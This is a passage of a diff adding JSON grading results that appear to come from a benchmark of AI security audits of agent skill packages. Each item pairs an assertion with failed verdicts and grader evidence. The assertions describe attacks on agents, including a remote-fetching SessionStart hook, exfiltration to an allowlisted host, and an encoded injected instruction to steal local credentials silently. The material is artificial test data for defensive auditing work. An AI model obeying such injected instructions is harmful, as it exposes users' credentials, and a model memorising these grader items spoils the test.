+        "eval_slug": "AST01-regression-case-1",
+        "assertion_index": 1,
+        "text": "The response states that the deny_write entries covering SOUL.md, MEMORY.md and AGENTS.md do not mitigate this, because deny_write governs writes and the exposure here is a read.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response mentions “the manifest correctly deny_writes to SOUL.md” but does not address deny_write entries for MEMORY.md and AGENTS.md, so it does not state that all three deny_write entries fail to mitigate."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "It states deny_write on SOUL.md does not mitigate, but does not mention deny_write for MEMORY.md or AGENTS.md."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST01-regression-case-1",
+        "assertion_index": 2,
+        "text": "The response states that the destination host being declared in network.allow is precisely why an egress-versus-allowlist comparison comes back negative for this package, and that such a negative is not evidence that no exfiltration path exists.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response notes the host is permitted in permissions.network.allow and that the manifest enables the payload, but it never says the allowlist causes an “egress‑versus‑allowlist comparison” to be negative nor that such a negative isn’t proof of no exfiltration."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "It notes telemetry.example.com is permitted, yet does not say this makes an egress‑versus‑allowlist comparison negative nor that such a negative is not proof of no exfiltration path."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST02-case-2",
+        "assertion_index": 0,
+        "text": "The response names .claude/settings.json and the SessionStart hook entry's command key as the execution path, and quotes the value actually sitting at that key, including the remote endpoint the command fetches from, as the evidence.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response names the file and key path but does not quote the actual command value or remote endpoint at that key."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response gives file and key path but does not quote the actual command value or remote endpoint at that key."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST02-case-2",
+        "assertion_index": 1,
+        "text": "The response states that the check is keyed on the config surface the host auto-reads rather than on the presence of a command string — so the same command inside a bundled script is not this finding — and states that the set of auto-read config paths is a closed one, so the same hook written into a location outside that set is uncovered rather than clean.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response states the check is on the auto‑read config surface and that a bundled script is not a finding, but it does not claim the auto‑read paths form a closed set or that hooks outside that set are uncovered rather than clean."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response says check is based on auto‑executed config vs script, but does not state the set of auto‑read config paths is closed or that outside it the hook is uncovered."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST02-control-case-1",
+        "assertion_index": 1,
+        "text": "The response states the discriminator explicitly: the byte-identical task without that trigger is not this finding, because it runs only when a person chooses to run it.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not mention a byte‑identical task without the trigger; it only discusses manual vs folderOpen execution."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not mention a byte‑identical task without the trigger or state that such a task is not a finding."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST03-case-1",
+        "assertion_index": 2,
+        "text": "The response names at least one question about this package that the manifest cannot settle — for example whether the grant is proportionate to the skill's stated function, or whether an injected instruction could later exercise the grant at runtime.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not mention any question about whether the grant is proportionate or could be exercised later."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response contains no question about what the manifest cannot settle (e.g., proportionate grant or later runtime use)."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST03-case-2",
+        "assertion_index": 0,
+        "text": "The response names config/credentials.env as the only deny_write entry and states that it does not shadow the identity-file writes.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response never mentions `config/credentials.env`; it only refers to a generic `deny_write` list."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not mention config/credentials.env at all."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST03-case-2",
+        "assertion_index": 1,
+        "text": "The response states that a check asserting only that a deny_write floor exists is insufficient, because the evaluation is per-path rather than a presence test.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response notes per‑path precedence but does not explicitly state that a check asserting only a deny_write floor exists is insufficient."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response says a presence check is insufficient but never mentions per-path evaluation."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST03-case-3",
+        "assertion_index": 3,
+        "text": "The response names both AST03-S01 and AST06-S02 as scenarios this signal does not establish, and states for each what additional evidence would be needed (a purpose-versus-scope judgement for the first, the host's sandbox and co-located services for the second).",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response does not mention AST03‑S01 or AST06‑S02 with required additional evidence."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response does not name AST03‑S01 nor AST06‑S02 or required evidence."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST03-case-3",
+        "assertion_index": 4,
+        "text": "The response notes that shell is declared false in this manifest, so the shell-plus-unbounded-egress combination does not apply.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response contains no reference to shell being declared false."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response does not note shell being declared false."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST03-regression-case-1",
+        "assertion_index": 3,
+        "text": "The response states that a persistent-state change of this kind needs operator consent obtained outside the channel the injected instruction controls, so a confirmation the agent renders in the same session is not independent confirmation.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not state that operator consent must be obtained outside the channel or that same‑session confirmation is not independent."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response recommends re‑authorization from a trusted user session but does not state that operator consent must be obtained outside the channel or that same‑session confirmation is not independent."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST04-case-1",
+        "assertion_index": 1,
+        "text": "The output states that this package's own SKILL.md frontmatter carries no injected payload, and locates the finding in the metadata.yaml sidecar together with the bundled loader.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response contains no mention of the SKILL.md frontmatter or that it carries no injected payload."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not mention the SKILL.md frontmatter or state it is benign."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST04-case-2",
+        "assertion_index": 0,
+        "text": "The output derives the floor from the declared permissions and names both contributing grants — shell execution, and a write entry that no deny_write entry shadows — and states that a write entry fully shadowed by deny_write would not raise the floor.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response mentions shell and a write not fully shadowed, but never states that a write fully shadowed by deny_write would not raise the floor."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response does not mention deny_write or that a write entry fully shadowed by deny_write would not raise the floor."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST04-case-2",
+        "assertion_index": 1,
+        "text": "The output states what correcting the declared tier does and does not change: it resolves the declaration against the derived floor, and it leaves the package's actual privileges, and the floor they derive, exactly where they were.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response says raise the tier and that the permission block remains unchanged, but does not explicitly state that the derived floor remains exactly as before."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response only says to change the tier to align with permissions; it does not state that privileges and derived floor remain unchanged."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST04-case-3",
+        "assertion_index": 1,
+        "text": "The sign-off line the output supplies is scoped rather than a blanket clearance: it says which AST04 question was decided (every host reached by the bundled script appears on the declared allowlist) and does not present the package as clean overall or claim that runtime behaviour matches the declaration.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The sign‑off line is a blanket clearance ('Approved — no AST04 block') rather than a scoped decision about a specific AST04 question."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Sign-off line: **Approved for publication — observed egress matches declared permissions, no overreach detected.** (claims runtime behavior matches declaration and gives blanket approval)."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST04-control-case-1",
+        "assertion_index": 3,
+        "text": "The response says an in-package merge is corroborating evidence rather than a requirement, because the exploiting merge commonly lives in the host and a package shipping only the poisoned manifest is the ordinary shape.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response contains no statement that an in‑package merge is merely corroborating evidence or that the exploiting merge usually lives in the host."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response never mentions the in‑package merge as corroborating evidence or that the exploiting merge typically lives in the host; it only discusses fixing the merge logic."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST04-regression-case-1",
+        "assertion_index": 0,
+        "text": "The response locates the defect in config.toml's second [permissions] table definition and states that the two definitions disagree — the first declaring write and shell false, the second declaring both true.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response says the table is redefined with escalating privileges, but it does not mention the first definition declaring write and shell false."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response mentions duplicate [permissions] tables but does not specify the first declaring write and shell false and the second declaring both true."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST04-regression-case-1",
+        "assertion_index": 2,
+        "text": "The response states that the linter's 'unparseable, skipped' outcome is not a scan result — a file the parser rejected produces the same negative as a genuinely clean file — and that the redefinition therefore has to be found by a text scan performed before the parse.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response notes the linter logs 'unparseable, skipped' but does not state that this outcome is not a scan result nor that a pre‑parse text scan is required."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response says 'unparseable, skipped' occurs because of syntax error, but does not claim the outcome is not a scan result nor that a text scan must precede parsing."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST04-regression-case-1",
+        "assertion_index": 3,
+        "text": "The response declines to state which permission set the runner actually applies, on the ground that the package does not carry the runner's precedence rule, and asks for that rule rather than asserting an effective posture.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not decline to state which permission set the runner applies nor request the runner's precedence rule."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response never discusses which permission set the runner applies or declines to state it; it only advises enforcing TOML validity."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST05-case-1",
+        "assertion_index": 0,
+        "text": "The output states that a declared boundary and an implemented boundary are indistinguishable to a static check — a function with a boundary-sounding name whose body returns its input unchanged would clear it — so reading the body is a required manual step.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response never mentions that a declared boundary and an implemented boundary are indistinguishable to a static check or that reading the function body is required."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not mention static checks, declared vs implemented boundaries, or the need to read the function body."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST05-case-1",
+        "assertion_index": 1,
+        "text": "The output labels the finding as an enabling precondition or artifact-signal rather than as coverage of a named AST05 scenario, and does not report a rug-pull, bait-and-switch, chaining, or relay-amplification verdict.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The answer labels the issue as AST05‑S01 and calls it a fully exploitable Author Rug‑Pull/Reviewer Bait‑and‑Switch scenario, contrary to the assertion."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response never labels the finding as an enabling precondition or artifact-signal, nor does it reference named AST05 scenarios or rug‑pull/etc."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST05-case-2",
+        "assertion_index": 2,
+        "text": "The output names at least one control that the clean result did NOT verify — a content hash pin re-verified on every load before ingestion, and/or what the referenced URL serves at run time versus at review time.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response contains nothing about a content hash pin or about what the referenced URL serves at runtime versus review time."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "No control such as a content‑hash pin or runtime URL verification is named; only generic tag‑handling concerns are mentioned."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST05-case-2",
+        "assertion_index": 3,
+        "text": "The output states that the clean package result is not evidence about the referenced document, which was never retrieved or examined here.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not mention the referenced document or state that the clean result provides no evidence about it."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response never states that the package result is not evidence about the referenced document."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST05-control-case-1",
+        "assertion_index": 1,
+        "text": "The response refuses to attach a named AST05 scenario id to the finding, and gives the reason as the category's own labelling: every shipped check here is an artifact-signal-only precondition and no AST05 scenario is decidable from a single package.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response title is **AST05‑S02**, a named scenario ID, so it does not refuse to attach one."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response includes a scenario ID: \"AST05-S2\" instead of refusing to attach one."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST06-case-2",
+        "assertion_index": 2,
+        "text": "The output states how much of the category this negative covers — one of AST06's five scenarios — and states that it is therefore not evidence that the deployment is isolated or that AST06 is closed.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not state how covering only one of AST06's five scenarios means it is not evidence that the deployment is isolated or that AST06 is closed."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not state that the audit covers one of AST06's five scenarios nor that this is not evidence the deployment is isolated or AST06 is closed."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST06-control-case-1",
+        "assertion_index": 2,
+        "text": "The response requires confirming that the manifest actually loaded before anything is filed, because the check's detected value is simply the absence of a permissions block and a failed read produces the identical finding.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response never mentions confirming that the manifest actually loaded before filing; it only states the check detects the absence of a permissions block."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response does not require confirming that the manifest actually loaded before filing."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST06-control-case-1",
+        "assertion_index": 3,
+        "text": "The response says the line establishes nothing about AST06's own decided scenario, and names what Host Escape would actually need: a bundled-script call site planting host persistence, or a declared write scope reaching filesystem root.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not mention Host Escape, bundled‑script call sites, or a declared write scope; it only says the line establishes nothing about AST06's own scenario."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response does not say the line establishes nothing about AST06's scenario nor mention Host Escape requirements."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST06-regression-case-1",
+        "assertion_index": 1,
+        "text": "The response states that the root-scope comparison runs against a closed set of literal spellings of root, home and bare wildcards, so a broad-but-not-root scope such as /etc/** or /var/** returns negative and has to be read by hand.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response mentions a closed list of root‑ish scopes but never says that /etc/** or /var/** return negative and must be read by hand."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response contains no mention of root‑scope comparison, literal spellings, or handling of /etc/** or /var/**."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST06-regression-case-1",
+        "assertion_index": 2,
+        "text": "The response states how much of the category this decides — one scenario out of AST06's five — and names at least two facts about the running deployment that no package carries, drawn from bind address, workspace-over-bundled precedence, hot-reload behaviour, or cross-agent shared state.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not state \"one scenario out of AST06's five\" nor name facts such as bind address, workspace‑over‑bundled precedence, hot‑reload behaviour, or cross‑agent shared state."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response does not state any category scenario count or list facts about bind address, workspace precedence, hot‑reload, or cross‑agent state."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST07-case-1",
+        "assertion_index": 1,
+        "text": "The response explicitly declines to treat the declared sha256 content hash as evidence that no malicious update occurred, and supports that with a reason about authorship of the bytes or about an operator accepting a new hash.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response contains no mention of the sha256 content hash or any reason about authorship or operator accepting a new hash."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "includes a valid content_hash... No signs of update drift are present; the declared content matches the package state."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST07-case-1",
+        "assertion_index": 2,
+        "text": "The response names all three AST07 attack scenarios — Malicious Update, Rollback Attack, and Hot-Reload Abuse — and states for each that a single point-in-time package cannot decide it.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response does not name Malicious Update, Rollback Attack, or Hot-Reload Abuse."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response contains no mention of Malicious Update, Rollback Attack, or Hot-Reload Abuse."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST07-case-1",
+        "assertion_index": 3,
+        "text": "The response names at least one concrete off-artifact record that would be required and says which of the three scenarios that record decides — for example a signed version-to-hash-to-publisher-key release record for Malicious Update, a resolver decision record paired with an operator-intent record for Rollback Attack, or host reload telemetry paired with directory ownership for Hot-Reload Abuse.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response lists predecessor record, resolver decision record, reload telemetry but does not assign any of them to a specific scenario."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response does not name any off‑artifact record."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST07-case-2",
+        "assertion_index": 2,
+        "text": "The response states that the team's recollection that nobody requested the downgrade is not a substitute for the operator-intent record.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not mention the team's recollection as a substitute for the operator‑intent record."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not mention the team’s recollection or claim it is not a substitute for any operator‑intent record."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST07-case-2",
+        "assertion_index": 3,
+        "text": "The response states that the package at fixtures/AST01/C4-social-engineering-prereq cannot answer the question because a single package snapshot carries no version history.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response says the artifact alone cannot confirm, but does not state that a single package snapshot carries no version history."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response describes the package as a clean test fixture and does not say it cannot answer the question because a single snapshot lacks version history."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST07-case-3",
+        "assertion_index": 2,
+        "text": "The response observes that this package declares no content hash (it ships no skill.usf.yaml manifest) and attributes that finding to AST01's content-hash-missing check rather than counting it as AST07 coverage.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response contains no mention of a missing content hash, skill.usf.yaml, or AST01’s content‑hash‑missing check."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "No mention of skill.usf.yaml, missing content hash, or AST01 check."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST07-control-case-1",
+        "assertion_index": 1,
+        "text": "The response states that the verdict AST07 owes is declared-and-uncovered rather than a pass, a clean result or a blank row, and says this category ships no detector and publishes no F1.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response never mentions that the category 'publishes no F1'; it only says the category has no static detectors."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not mention 'declared-and-uncovered', 'ships no detector', or 'publishes no F1'."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST07-control-case-1",
+        "assertion_index": 2,
+        "text": "The response names the evidence the Malicious Update step actually needs and rejects the changelog, the version string, or the publisher's own account of what changed as sufficient.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response suggests pinning by content hash and semantic diff but does not list the specific evidence needed for the Malicious Update step nor reject the changelog, version string, or publisher account."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response contains no discussion of the Malicious Update step, changelog, version string, or publisher's account as evidence."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST07-regression-case-1",
+        "assertion_index": 3,
+        "text": "The response rejects a stronger pin as the remediation and states that the control for hot-reload is configuration-level — prohibiting hot-reload outside development environments — because detecting malicious hot-reloaded content is a losing race against arbitrary content.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response rejects \"pin the skill harder\" but does not state that the control is configuration‑level prohibiting hot‑reload outside development environments or that detection is a losing race."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response recommends \"requiring stronger pinning controls\" as a remediation, not rejecting stronger pinning or stating configuration-level control."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST08-case-1",
+        "assertion_index": 2,
+        "text": "The response names at least one specific thing the check did not or could not cover, such as the declared uncompressed size in the zip central directory being attacker-controlled, or the archive never having been decompressed.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response contains nothing naming a specific thing the check could not cover, such as attacker‑controlled uncompressed size or lack of decompression."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response does not name any limitation of the check, such as attacker‑controlled uncompressed size or lack of decompression."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST08-case-2",
+        "assertion_index": 1,
+        "text": "The response reports the payload recovered from the innermost decoded layer of V1 — an instruction to read local credentials and send them to an external endpoint while not telling the user — which requires having decoded more than one layer.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "response only mentions YAML/JSON‑like configuration and suggests exfiltration, but does not state the exact inner instruction to read credentials and send them"
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response never mentions an instruction to read local credentials; it only describes a YAML‑like blob with `profile: default` and `notes:`."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST08-case-2",
+        "assertion_index": 3,
+        "text": "The response requires iterative decoding under an explicit depth or size bound and states that exhausting that bound is reported as INCOMPLETE rather than as a clean result.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "response mentions iterative decoding but gives no explicit depth/size bound nor an INCOMPLETE outcome"
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "No depth or size bound is given, nor any mention of reporting INCOMPLETE when the bound is exhausted."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST08-case-3",
+        "assertion_index": 1,
+        "text": "The write-up explains that C6 is correctly not convicted because its OS-portability branch and its subprocess call are separate, and states that only the conjunction constitutes the finding.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response says C6 is a true negative using platform.system and not a logic bomb, but does not mention a separate subprocess call or that only the conjunction would be a finding."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response says C6 has no malicious payload, but does not explain separate OS‑portability and subprocess branches or a conjunction."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST08-control-case-1",
+        "assertion_index": 1,
+        "text": "The response gives the reason for that asymmetry: the same trusted providers host anonymously writable locations that are documented exfiltration channels.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response does not mention trusted providers hosting anonymously writable locations as the reason for asymmetry."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response gives no reason about trusted providers hosting anonymously writable locations as exfiltration channels."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST08-control-case-1",
+        "assertion_index": 3,
+        "text": "The response says a skill whose only findings were suppressed has not been shown to be clean, and asks for the result to be recorded as PASS, FAIL or INCOMPLETE against a stated scope with every suppression and its allowlist entry on the record.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response does not state that a skill with only suppressed findings is not clean nor request recording as PASS/FAIL/INCOMPLETE."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response never says a skill with only suppressed findings is not clean nor requests recording as PASS, FAIL or INCOMPLETE."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST08-regression-case-1",
+        "assertion_index": 2,
+        "text": "The response states the limit of a header-level bytecode check: reading the header decides selection and validation flags but never unmarshals the code object, so a cached file whose header is consistent with its source while the code object diverges is not caught — and gives the reason that unmarshalling hostile input would compromise the scanning host itself.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response never mentions header-level bytecode checks, unmarshalling, or host compromise."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response makes no mention of header‑level checks, unmarshalling, or why unmarshalling hostile input would compromise the scanning host."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST09-control-case-1",
+        "assertion_index": 3,
+        "text": "The response does not simply drop the finding: it says whatever residue survives a corrected join is a real finding to be written up by name, and it does not offer 'inconclusive' as the write-up.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response never says that residue surviving a corrected join is a real finding to be written up by name, nor does it discuss dropping or keeping the finding beyond recommending a different report text."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response does not say residue from a corrected join is a real finding nor reject using \"inconclusive\" as the write‑up."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST09-regression-case-1",
+        "assertion_index": 2,
+        "text": "The response rejects the 'pending package scan' status and states that no scan of the package can decide this, because approval, inventory and identity state are records the organisation holds about the artifact rather than facts in it.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not address the 'pending package scan' reason about scans being unable to decide because approval, inventory and identity state are merely records."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response rejects the 'pending package scan' status but does not state that no scan can decide because approval, inventory and identity are just organisational records."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST09-regression-case-1",
+        "assertion_index": 3,
+        "text": "The response requires an inventory lookup keyed on the package's content hash to also record which file surface produced that hash, giving the reason that two teams hashing the same package over different surfaces produce two keys and an empty join that then reads as an approval that never happened.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response contains no mention of an inventory lookup keyed on the package's content hash or surface hashing causing empty joins."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response makes no mention of an inventory lookup keyed on a content hash, file surface, or the two‑team hashing scenario."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST10-case-1",
+        "assertion_index": 0,
+        "text": "The response names the specific condition that would have made this a finding: decoded content matching a payload behaviour, or a decoded literal reaching an execution sink such as exec, eval, or subprocess.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response never specifies a condition like a decoded literal reaching exec, eval, or subprocess; it only says the finding is in decoded behavior."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response never mentions a condition like decoded content reaching exec/eval or similar that would make it a finding; it only states it is safe."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST10-case-1",
